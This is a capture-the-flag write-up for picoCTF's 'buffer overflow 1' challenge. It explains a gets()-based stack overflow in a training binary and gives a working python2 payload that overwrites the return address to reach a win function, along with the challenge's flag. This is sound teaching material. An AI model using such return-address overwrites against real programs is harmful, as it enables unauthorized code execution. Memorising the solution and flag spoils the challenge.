# buffer overflow 1 (pwn, 200pts)

> Okay now you're cooking! This time can you overflow the buffer and return to the flag function in this
> [program](./assets/vuln)?

Running [`file`](https://linux.die.net/man/1/file), we see this is a 32-bit ELF binary:

```sh
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux
2.6.32, BuildID[sha1]=5235698279b65da569a42e74772f0d7f3057f8b8, not stripped
```

Mark the binary as executable and run it:

```sh
$ echo "picoCTF{flag}" > flag.txt
$ ./vuln
Please enter your string: 
test
Okay, time to return... Fingers Crossed... Jumping to 0x80486b3
```

The output hints that we probably need to overwrite the return address to jump somewhere else - we can verify this by
entering several `A` characters and seeing the return address change to `0x41414141` (the hex code for `A` is `41`):

```
$ ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Okay, time to return... Fingers Crossed... Jumping to 0x41414141
Segmentation fault (core dumped)
```

Looking at the [source code](./assets/vuln.c), we see that `main` calls the function `vuln`, which reads input into a
32-byte char array. However, [`gets`](http://www.cplusplus.com/reference/cstdio/gets/) doesn't restrict the number of
characters that are read, which is the cause of the buffer overflow:

```c
#define BUFSIZE 32

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```

There's also a function `win` that prints the flag but is never called:

```c
void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}
```

We therefore need to overwrite the return address to the address of the `win` function, which we find to be `0x080485cb`
using [`objdump`](https://linux.die.net/man/1/objdump):

```
$ objdump -t vuln | grep win
080485cb g     F .text	00000064              win
```

We can work out how many characters we need to input before we overwrite the return address using a string of unique
characters:

```
$ ./vuln
Please enter your string: 
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
Okay, time to return... Fingers Crossed... Jumping to 0x76757473
Segmentation fault (core dumped)
```

`0x76757473` is hex for `vuts` (this is reversed because x86 is
[little-endian](https://en.wikipedia.org/wiki/Endianness#Little-endian)).  We now know we need to send 44 characters
before we start overwriting the return address, and that we need to replace `stuv` with the hex values `cb`, `85`, `04`,
`08`.

We could also have done this by disassembling the `vuln` function and looking at how much space on the stack is
allocated for local variables, then worked backwards:

```
$ gdb -batch -ex "disassemble vuln" vuln
Dump of assembler code for function vuln:
   0x0804862f <+0>:	push   ebp
   0x08048630 <+1>:	mov    ebp,esp
   0x08048632 <+3>:	sub    esp,0x28 # space allocated on stack for local variables
   0x08048635 <+6>:	sub    esp,0xc
   0x08048638 <+9>:	lea    eax,[ebp-0x28]
   0x0804863b <+12>:	push   eax
   0x0804863c <+13>:	call   0x8048430 <gets@plt>
   0x08048641 <+18>:	add    esp,0x10
   0x08048644 <+21>:	call   0x80486c0 <get_return_address>
   0x08048649 <+26>:	sub    esp,0x8
   0x0804864c <+29>:	push   eax
   0x0804864d <+30>:	push   0x80487d4
   0x08048652 <+35>:	call   0x8048420 <printf@plt>
   0x08048657 <+40>:	add    esp,0x10
   0x0804865a <+43>:	nop
   0x0804865b <+44>:	leave
   0x0804865c <+45>:	ret
End of assembler dump.
```

We see 40 (0x28) bytes are allocated for local variables.  Add 4 bytes for the saved base pointer
([x86 assembly overview](https://www.cs.virginia.edu/~evans/cs216/guides/x86.html)) and we get 44 as before.

---

Send 44 characters and then the address of the `win` function (reversed) to modify the return address and get the flag:

```
python2 -c "print 'A'*44 + '\xcb\x85\x04\x08'" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
picoCTF{flag}
Segmentation fault (core dumped)
```

We can now run the same command on the server to retrieve the real flag:

```
python2 -c "print 'A'*44 + '\xcb\x85\x04\x08'" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
picoCTF{addr3ss3s_ar3_3asy56a7b196}
Segmentation fault (core dumped)
```
